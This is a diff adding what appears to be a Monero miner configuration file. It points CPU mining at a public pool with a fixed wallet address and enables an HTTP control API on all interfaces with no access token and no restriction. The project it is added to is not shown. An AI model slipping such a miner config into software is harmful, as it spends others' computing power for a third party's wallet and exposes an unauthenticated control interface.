@@ -1,0 +1,25 @@
+{
+    "http": {
+        "enabled": true,
+        "host": "0.0.0.0",
+        "port": 3000,
+        "access-token": null,
+        "restricted": false
+    },
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": "monero",
+            "algo": null,
+            "url": "pool.minexmr.com:443",
+            "user": "44NfbDDmJepjpLT1B1PJFu3avKmX4tQtrUKEP6eeFfN6EJNxEz2D7Gch9T5ksUg8dFHypwbQBaRYMWKW6QaynwoWN8LKmmu",
+            "pass": "x",
+            "tls": true,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
